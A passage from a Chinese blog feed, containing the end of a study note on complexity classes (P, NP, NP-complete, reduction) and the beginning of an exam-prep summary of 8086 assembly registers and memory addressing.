      <url>/posts/f4c69437cf30/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a class="markdownIt-Anchor" href="#引言"></a> 引言</h2><p>在前面的章节中，我们解决了不同复杂性的问题。一些算法具有较低的增长率，而另一些具有较高的增长率。增长率低的问题被称为简单问题(或易于解决的问题)，而增长率高的问题被称为难题(或难以解决的问题)。这种分类是根据算法解决问题的运行时间(或内存)来进行的。</p><table><thead><tr><th>时间复杂度</th><th>数量级</th><th>例子</th><th>问题类别</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td><td>常数阶</td><td>将元素插入链表头部</td><td>易于解决的问题</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>对数阶</td><td>在二叉搜索树中搜索元素</td><td>易于解决的问题</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>线性阶</td><td>在无序数组中查找元素</td><td>易于解决的问题</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nlogn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>线性对数阶</td><td>归并排序</td><td>易于解决的问题</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>平方阶</td><td>图中两个顶点的最短路径</td><td>易于解决的问题</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>立方阶</td><td>矩阵相乘</td><td>易于解决的问题</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mi>n</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(2^n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>指数阶</td><td>汉诺塔问题</td><td>难以解决的问题</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">!</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n!)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">!</span><span class="mclose">)</span></span></span></span></td><td>阶乘阶</td><td>字符串排列</td><td>难以解决的问题</td></tr></tbody></table><p>有许多我们并不知道如何求解的问题。到目前为止，我们所看到的所有问题都是那些可以通过计算机在确定性时间内解决的问题。在开始本章的讨论之前，让我们看看本章中需要使用到的基本术语。</p><p>在计算机科学中，为了理解不存在解决方案的问题，将问题分为不同的类，我们称之为复杂性类(complexity class)。在复杂性理论中，复杂性类是一组与复杂性有关的问题。它是计算理论的一个分支，主要研究为了求解一个给定问题的计算过程中所需的资源。</p><p>最常见的资源有时间(算法需要花费多少时间代价来解决问题)和空间(算法需要花费多少内存代价来解决问题)。</p><h2 id="复杂性类的类型"><a class="markdownIt-Anchor" href="#复杂性类的类型"></a> 复杂性类的类型</h2><h3 id="p类"><a class="markdownIt-Anchor" href="#p类"></a> P类</h3><p>P类问题是可以用多项式时间求解的确定性机器来求解的一组判定性问题（P代表多项式时间）。P类问题是一组容易找到解决方案的问题。</p><p>代表：排序、图的连通性、最短路径等问题。</p><h3 id="np类"><a class="markdownIt-Anchor" href="#np类"></a> NP类</h3><p>NP（代表非确定性多项式时间）类问题是可以通过多项式时间的非确定性机器求解的一组判定性问题。NP类问题是指一组难以找到解决方案但易于验证的问题。这意味着，如果有人解决了NP类问题，我们可以在多项式时间内告诉他这个问题是否正确。</p><p>代表：旅行商问题（TSP）、布尔可满足性问题（SAT）等。</p><h3 id="co-np类问题"><a class="markdownIt-Anchor" href="#co-np类问题"></a> Co-NP类问题</h3><p>Co-NP问题是NP问题的补集，也就是与NP问题相反。如果Co-NP问题中的答案是否定的，那么这个事实就可以用多项式时间来检查。</p><table><thead><tr><th>P</th><th>可以在多项式时间内求解</th></tr></thead><tbody><tr><td>NP</td><td><strong>是</strong>实例可以在多项式时间内验证</td></tr><tr><td>Co-NP</td><td><strong>否</strong>实例可以在多项式时间内验证</td></tr></tbody></table><p>代表：全称可满足性问题（TAUT，是否所有的布尔公式都为真）等。</p><h3 id="p类-np类和co-np类的关系"><a class="markdownIt-Anchor" href="#p类-np类和co-np类的关系"></a> P类、NP类和Co-NP类的关系</h3><p>P类问题也是NP类问题。如果一个问题是P类问题，那么我们可以在多项式时间内验证它的是实例。类似地，P类问题也是Co-NP类问题。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/NP%E4%B8%8EP.drawio.png" alt="NP与P.drawio" /></p><p>计算机中一个很重要的开放性问题是证明是否P=NP。直观上P≠NP，但是没人知道怎么证明。另一个开放性问题是NP和Co-NP是否不同。即我们可以快速验证每个是实例，也不能认为我们同样可以快速验证某个否实例。一般认为NP≠Co-NP，但也没有人知道如何证明。</p><h3 id="np难类"><a class="markdownIt-Anchor" href="#np难类"></a> NP难类</h3><p>NP中的每个问题都可以<strong>归约</strong>（后续会介绍）为NP难（NP-hard）问题。由于NP难问题可能不在NP中（即，可能没有多项式时间解法的问题），因此需要很长的时间才能验证他们。如果有人给出了NP难问题的解，我们需要很长的时间来验证给出的解是否正确。</p><p>如果K是NP难问题，那么蕴含着：如果K能够在多项式时间内被求解，则可证P=NP（因为所有的NP问题都可以被归结为NP难）。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/NP%E4%B8%8ENP%E9%9A%BE.png" alt="NP与NP难" /></p><p>代表：包含很多的优化问题和决策问题，比如旅行商问题的优化版本、3-SAT等</p><h3 id="np完全类"><a class="markdownIt-Anchor" href="#np完全类"></a> NP完全类</h3><p>最后，如果一个问题既是NP难问题和NP问题，那么该问题是NP完全（NP-complete/NPC）问题。NP完全问题是NP中最难的问题。如果有人能发现一个NP完全问题的多项式时间算法，那么就可以找到每个NP完全问题的多项式时间算法。</p><p>这意味着我们可以快速检查答案，并且NP中的每个问题都可以归约到该问题。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/NPC%E9%97%AE%E9%A2%98.png" alt="NPC问题" /></p><p>代表：经典的NP完全问题包括3-SAT、顶点覆盖问题（Vertex Cover）、哈密顿回路问题（Hamiltonian Circuit）等。</p><h3 id="npc和np难的关系"><a class="markdownIt-Anchor" href="#npc和np难的关系"></a> NPC和NP难的关系</h3><ul><li>NP难问题至少和NPC问题一样难。</li><li>NPC问题肯定是NP难的，但是反之不一定</li></ul><p>因为NPC问题虽然目前无法在多项式时间内给出解法，但是可以在多项式时间内验证解的正确性；而NP难问题则可能无法保证能在多项式时间内验证解。</p><h3 id="各类关系"><a class="markdownIt-Anchor" href="#各类关系"></a> 各类关系</h3><p>我们可以总结出P类、NP类、Co-NP类、NP难类和NP完全类的关系，如图所示（请注意这些目前还只是一个假设）：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%90%84%E7%B1%BB%E5%85%B3%E7%B3%BB.png" alt="各类关系" /></p><p>NP难问题是NP完全问题的严格超集(superset)。一些问题(如停机问题)是NP难问题，但不是NP问题。一般而言，NP难问题可能无法解决。我们可以给出NP难问题和NP完全问题困难性之间的不同，因为NP类包含了所有比“最棘手”问题更容易的事情——如果一个问题不在NP中，那么该问题比NP中的所有问题都要困难。</p><h3 id="pnp吗"><a class="markdownIt-Anchor" href="#pnp吗"></a> P==NP吗？</h3><blockquote><p>美国麻省的Clay数学研究所于2000年5月24日在巴黎法兰西学院宣布：对七个“千年数学难题”中的每一个均悬赏100万美元，而问题NP =？P位列其首:</p><ol><li>P问题对NP问题</li><li>霍奇猜想</li><li>庞加莱猜想(2002.11-2003.7，俄罗斯数学家佩雷尔曼在3篇论文预印本中证明了几何化猜想，2006被授予菲尔兹奖)</li><li>黎曼假设</li><li>杨－米尔斯存在性和质量缺口</li><li>纳维叶－斯托克斯方程的存在性与光滑性</li><li>贝赫和斯维讷通－戴尔猜想</li></ol></blockquote><p>如果P=NP，这意味着每个可以被快速验证的问题都可以被快速解决。</p><p>这是一个世界性难题，目前没有人知道答案，因为现在没有人能证明P是否等于NP。许多NP完全问题至今还没有找到快速的解决方法。如果P=NP，那么就意味着有办法在多项式时间内解决这些NP完全问题。“快速”意味着解决这些问题不需要试错法。目前，求解这些问题可能需要数百万年，而未来的计算机可能将这数百万年的计算时间缩短到几分钟以内。</p><h3 id="归约"><a class="markdownIt-Anchor" href="#归约"></a> 归约</h3><p>假如我们想解问题X，但是X又非常复杂。这时候，我们想到有类似X的问题（假设为问题Y），那么我们可以尝试把X映射成Y，并通过解决Y来解决X。这个过程被称为<strong>归约</strong>。</p><p>我们需要一些算法将问题X映射到问题Y，这可能需要花费线性或者更多的时间。基于这一点，解决问题X的成本可以表达如下：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>解决</mtext><mi>X</mi><mtext>的成本</mtext><mo>=</mo><mtext>解决</mtext><mi>Y</mi><mtext>的成本</mtext><mo>+</mo><mtext>归约的时间</mtext></mrow><annotation encoding="application/x-tex">解决X的成本=解决Y的成本+归约的时间</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">决</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">本</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">决</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">本</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">归</span><span class="mord cjk_fallback">约</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">间</span></span></span></span></p><p>有时候我们可能需要多次调用使用Y的算法去解决问题X，则此时X的成本可以表示为：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>解决</mtext><mi>X</mi><mtext>的成本</mtext><mo>=</mo><mtext>调用次数</mtext><mo>×</mo><mtext>解决</mtext><mi>Y</mi><mtext>的成本</mtext><mo>+</mo><mtext>归约的时间</mtext></mrow><annotation encoding="application/x-tex">解决X的成本=调用次数\times 解决Y的成本 + 归约的时间</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">决</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">本</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">数</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">决</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">本</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">归</span><span class="mord cjk_fallback">约</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">间</span></span></span></span></p><p>NP完全问题涉及的主要问题就是归约。这意味着，我们可以将给定的NP完全问题归约为其他已知的归约完全问题。由于NP完全问题很难被解决，并且为了证明给定的NP完全问题是困难的，我们可以选择一个已知的难题（已经证明了难题的困难性），通过将给定问题映射到该难题上的方法证明给定问题的困难性。</p><p>将给定难题归约到已知难题并不是强制的。有时候，我们也会将已知难题归约到给定难题。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/100852589_p0.jpg" alt="100852589_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 复杂性理论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编味小饼干</title>
      <link href="/posts/6e1e8506b86f/"/>
      <url>/posts/6e1e8506b86f/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编味浓缩饼干"><a class="markdownIt-Anchor" href="#汇编味浓缩饼干"></a> 汇编味浓缩饼干</h1><p>为备考而制作的知识点汇总，方便考生快速而准确的浏览到汇编语言中的重点。内容简单干脆，小巧精美。希望每一个阅读的考生都能像嚼饼干一样轻松的拿下汇编。</p><p>本汇编知识点汇总基于8086操作系统总结而成，参考教科书《汇编语言》·王爽著。</p><h2 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h2><p>一些8086组成原理的基本介绍，属于汇编中的开胃小菜。</p><h3 id="储存单元"><a class="markdownIt-Anchor" href="#储存单元"></a> 储存单元</h3><ul><li><p>一个双字（dword）有两个字（word）</p><p>双字：4f  00  24  c2</p><p>字：24  c2</p></li><li><p>一个字（word）有两个字节（byte）</p><p>字：24  c2</p><p>字节：24、c2  （十六进制下）</p></li><li><p>一个字节（byte）有8个位（bit）</p><p>字节：c2</p><p>位：11000010  （1个低位字节十六进制展开对应4个二进制位，一个字节展开就是8个位）</p></li></ul><p>通常来说，8086的内存单元即指代的是一个字节。</p><p>注意8086机器大多采用<strong>小端序</strong>，即低位在前高位在后。所谓低位字节/字即<strong>右</strong>半部分，高位即<strong>左</strong>半部分。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240611200053470.png" alt="image-20240611200053470" style="zoom:67%;" /><p>比如AX=100111000100000，则填充AX为16位：01001110 00100000，AH=01001110，AL=00100000。</p><h3 id="cpu的读写功能"><a class="markdownIt-Anchor" href="#cpu的读写功能"></a> CPU的读写功能</h3><p>CPU对内存及存储器的读写依赖于<strong>三根总线</strong>：</p><ul><li>地址总线</li><li>数据总线</li><li>控制总线</li></ul><p>具体工作流程如下：</p><ol><li>通过地址线发出地址信息</li><li>通过控制线发出内存读写命令</li><li>通过数据线传入/传出数据</li></ol><h3 id="三大总线"><a class="markdownIt-Anchor" href="#三大总线"></a> 三大总线</h3><p>总线的根数成为<strong>宽度</strong>。</p><p>地址总线的宽度决定了它的寻址能力。比如地址总线宽度为10，说明有10根线，每根线对应高低电平可以视为二进制，那么这个地址总线就具备2<sup>n</sup>的寻址能力。</p><p>数据总线的宽度决定了它的传输能力。8086CPU的数据总线宽度为16，有16根线，那么每次就能传送16位数据，也就是两个字节/一个字。</p><p>控制总线是一些不同控制线的集合，有多少根控制总线，意味着CPU对外部器件提供了多少种控制。</p><h3 id="16位cpu"><a class="markdownIt-Anchor" href="#16位cpu"></a> 16位CPU</h3><p>8086是16位机，经过对三大总线的宽度介绍，我们现在可以很轻松的理解16位结构（16位机、字长为16位）的含义。概括的说，有以下三个特性：</p><ul><li>运算器一次最多可以处理16位的数据。</li><li>寄存器最大宽度为16位。</li><li>寄存器与运算器之间的通路为16位。</li></ul><h3 id="存储器芯片与内存地址空间"><a class="markdownIt-Anchor" href="#存储器芯片与内存地址空间"></a> 存储器芯片与内存地址空间</h3><p>一般由读写属性可分为两类：随机存储器（RAM）和只读存储器（ROM）。随机存储器可读可写，但是必须带电存储，关机后存储内容丢失；只读存储器只能读不能写，关机后内容不丢失。</p><p>基于以上特性，RAM常被用来存放供CPU使用的绝大部分程序与数据，包括主存储器、显存和接口卡上的存储器。而ROM常被用来存储BIOS（Basic Input/Output System）。</p><p>地址空间分配如下：</p><ul><li>0~7fffh的32kb为主随机存储器的地址空间</li><li>8000h~9fffh的8kb空间为显存地址空间</li><li>a000h~ffffh的24kb为各个ROM的地址空间</li></ul><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240611195132240.png" alt="image-20240611195132240" style="zoom:67%;" /><h3 id="8086与物理地址"><a class="markdownIt-Anchor" href="#8086与物理地址"></a> 8086与物理地址</h3><p>学会计算实际的物理地址是汇编中的基础操作。在8086中，物理地址=段地址*16+偏移地址。</p><p>我们以段地址寄存器DS和偏移寄存器DI举例。</p><p>计算时用DS*16+DI，在十六进制下即将DS中的四位十六进制数左移一位与DI中的地址相加得到实际地址。</p><p>由于段地址*16必然是16的倍数，所以一个段的起始地址也一定是16的倍数；同时，偏移地址为16位，16位地址的寻址能力为64kb，即一个段的最大长度为64kb。</p><blockquote><p>2<sup>10</sup> = 1024</p><p>FFFFH = 1111 1111 1111 1111 = 2<sup>16</sup> = 2<sup>6</sup> * 1024 = 64kb</p></blockquote><h2 id="寄存器"><a class="markdownIt-Anchor" href="#寄存器"></a> 寄存器</h2><p>介绍了CPU中各个寄存器的作用，基础且重要，不过也很简单。</p><h3 id="ax寄存器accumulator"><a class="markdownIt-Anchor" href="#ax寄存器accumulator"></a> AX寄存器·Accumulator</h3><p>AX是四大通用寄存器中的一员（AX、BX、CX、DX）</p><p>此外，AX也被称为累加器，在许多运算过程中都用于存储和操作数据。</p><p>除了常规的加减法外，在使用<code>mul</code>指令执行乘法操作时：</p><ul><li>被乘数为8位，放置在AL中；调用<code>mul 乘数</code>，最终结果存储在AX内。</li><li>被乘数为16位，放置在AX中；调用<code>mul 乘数</code>，最终结果低位储存在AX内，高位储存在DX内。</li></ul><p>使用<code>div</code>指令执行除法操作时：</p><ul><li>除数为8位，则被除数16位默认在AX中；调用<code>div 除数</code>，最后AH存储余数，AL存储商。</li><li>除数为16位，则被除数32位默认高位在DX，低位在AX；<code>div 除数</code>，最后DX存储余数，AX存储商。</li></ul><h3 id="bx寄存器base"><a class="markdownIt-Anchor" href="#bx寄存器base"></a> BX寄存器·Base</h3><p>BX也是通用寄存器。</p><p>BX也被称为基址寄存器，可以用来进行内存寻址。比如8086允许DS:[BX]的寻址调用，而DS:[AX]的使用是非法的。</p><p>同样可以进行内存寻址的还有SI、DI、BP寄存器。</p><h3 id="cx寄存器count"><a class="markdownIt-Anchor" href="#cx寄存器count"></a> CX寄存器·Count</h3><p>CX寄存器也是一个通用寄存器。</p><p>CX又被称为计数寄存器，最重要的用途就是用来循环计数。当调用<code>loop 标号</code>指令时，会执行以下操作：</p><ol><li><p>CX = CX - 1</p></li><li><p>CX==0 ? 执行下一条指令 : jmp 标号</p><p>即检查CX的值是否为0，如果为0则退出循环，否则跳转回标号继续循环。</p></li></ol><p>值得注意的是如果CX已经等于0，再去进行<code>loop</code>调用，那么CX会先递减并发生下溢舍去符号位变为<code>FFFFh</code>，然后跳出循环检测为假陷入无限循环。</p><p>此外，再进行字符串处理时，比如调用<code>cmpsb</code>，<code>movsb</code>等指令时，CX也用来处理要储存的字符串的长度。<code>rep</code>会根据CX的值来决定循环次数。</p><h3 id="dx寄存器data"><a class="markdownIt-Anchor" href="#dx寄存器data"></a> DX寄存器·Data</h3><p>DX也是通用寄存器。</p><p>同时，DX也被称为数据寄存器。在前文的乘除法操作中，DX常和AX一起使用来存储数据。</p><p>此外，在进行IO端口映射时，DX也用于做端口地址寄存器。调用<code>in</code>和<code>out</code>指令端口映射时，用DX储存要访问端口的地址。</p><p>在某些时刻DX还能做数据传输操作的来源或者地址，比如调用<code>int 21h</code>中断例程时，常用DX存储要打印或者输入的字符串内存地址。</p><h3 id="si寄存器source-index"><a class="markdownIt-Anchor" href="#si寄存器source-index"></a> SI寄存器·Source Index</h3><p>SI寄存器，常被称为源索引寄存器。在8086中主要用于字符串操作和间接寻址。</p><ol><li><strong>字符串操作</strong>：在执行字符串指令时，SI寄存器通常用作源字符串的偏移量。例如，在执行<code>MOVSB</code>（移动字符串字节）或<code>STOSB</code>（存储字符串字节）等指令时，ES:SI寄存器指向源字符串的当前位置，而DS:DI则指向要转移的目标位置。</li><li><strong>间接寻址</strong>：SI寄存器和BX一样，可以用于间接寻址模式。其中它作为基地址寄存器，与偏移量结合来形成完整的内存地址。</li><li><strong>数据传输</strong>：在数据传输操作中，SI寄存器可以作为源地址寄存器，用于从内存中读取数据。</li></ol><p>注意：SI寄存器无法分成两个8位寄存器来使用</p><h3 id="di寄存器destination-index"><a class="markdownIt-Anchor" href="#di寄存器destination-index"></a> DI寄存器·Destination Index</h3><p>DI寄存器，通常被称为目的索引寄存器。它与SI寄存器类似，主要用于字符串操作和间接寻址。</p><ol><li><strong>字符串操作</strong>：在执行字符串指令时，DI寄存器通常用作目的字符串的偏移量。在执行<code>MOVSB</code>等指令时，DS:DI指向要转移的目标位置。</li><li><strong>间接寻址</strong>：DI寄存器可以用于间接寻址模式，其中它作为基地址寄存器，与偏移量结合来形成完整的内存地址。</li><li><strong>数据传输</strong>：在数据传输操作中，DI寄存器可以作为目的地址寄存器，用于将数据写入内存。</li></ol><p>注意：DI寄存器也无法分成两个8位寄存器来使用</p><h3 id="栈寄存器"><a class="markdownIt-Anchor" href="#栈寄存器"></a> 栈寄存器</h3><p>和栈相关的寄存器有：SP寄存器·Stack Point、BP寄存器·Base Point、SS寄存器·Stack Segment。</p><p>SP寄存器代表堆栈指针，用于指向当前堆栈的顶部；SS寄存器是堆栈段寄存器，用来存储当前堆栈使用的段地址；BP是基址指针，用来指向当前堆栈帧的基地址，可以配合SS寄存器进行寄存器相对寻址。</p><p>栈是汇编语言中管理数据的一个重要方法。8086CPU不能直接和内存交换数据，必须要把内存读入寄存器，再送入CPU进行处理。如果我们编写了复杂的程序，寄存器可能会不够用。这时最好的办法就是把寄存器的数据推入栈中保存，执行完对应的过程后再弹出。</p><p>和栈相关的寄存器有SS、SP、BP。我们只讨论SS和SP，SS:SP始终指向栈顶元素。一般用<code>push</code>和<code>pop</code>来管理栈。</p><p>当执行<code>push ax</code>时，进行操作：</p><ol><li>SP = SP - 2</li><li>将ax的数据送入SS:SP所指的内存单元</li></ol><p>同理执行<code>pop ax</code>时，进行操作：</p><ol><li>将SS:SP所指的内存单元送入ax处</li><li>SP = SP + 2</li></ol><p>一个常见的考点是，给定栈的范围和SS的值，求SP的值。这里要注意的一点是，SP应该指向栈空间最高地址单元的下一格，具体原因如下图。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E6%B1%87%E7%BC%96%C2%B7%E6%A0%88%E7%9A%84%E7%A4%BA%E6%84%8F%E5%9B%BE.drawio.png" alt="汇编·栈的示意图.drawio" /></p><p>给定栈空间10000H~1000FH作为栈，SS=1000H，则SP应为：000FH + 1 = 0010H。</p><p>注意，图中AX数据为2266H，AH=22H，AL=66H；故高位内存单元1000FH存放高位字节22H，低位内存单元存放低位字节66H。</p><h3 id="段寄存器"><a class="markdownIt-Anchor" href="#段寄存器"></a> 段寄存器</h3><p>段寄存器有DS数据段寄存器·Data Segment、ES附加段寄存器·Extra Segment、CS代码段寄存器·Code Segment和SS堆栈段寄存器·Stack Segment。其中SS寄存器前文已经介绍过。</p><p>一般来说，DS用于指定当前的数据段基址。所有的内存操作，均默认以DS寄存器内的数据作为段偏移地址计算内存地址。ES寄存器最初设计用于提供额外的内存寻址能力，但在现代x86架构中，它的用途已经减少。但是在诸如<code>cmpsb</code>等指令的调用中，还是需要指定ES的值配合SI目的偏移寄存器来使用。</p><p>CS常和IP指令指针寄存器·Instruction Point搭配使用。CS和IP是8086CPU中最关键的两个寄存器。在任意时刻，8086CPU将CS:IP指向的内容当做指令执行。</p><p>8086CPU的工作流程可以概括如下：</p><ol><li>从 CS:IP 指向的内存单元读取指令，读取的指令进入指令缓冲器</li><li>IP=IP+所读取指令的长度，从而指向下一条指令</li><li>执行指令。转到步骤(1)，重复这个过程。</li></ol><p>注意IP的执行顺序是：先读取指令 -&gt; 缓存指令 -&gt; IP下移至下一条指令 -&gt; 执行指令。尤其是在使用了<code>jmp</code>等跳转指令时小心，此时IP在执行跳转标号处的指令时会连续移动三次（读入<code>jmp</code>后指向下一条指令、跳转到标号指令、读入标高处指令并指向下一条指令）。</p><h3 id="psw寄存器program-status-word"><a class="markdownIt-Anchor" href="#psw寄存器program-status-word"></a> PSW寄存器·Program Status Word</h3><p>PSW寄存器即程序状态字寄存器，在8086中，即我们所学的Flag标志寄存器。它的特定位数有对应的用途。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240611205022872.png" alt="image-20240611205022872" style="zoom:80%;" /><p>flag 的 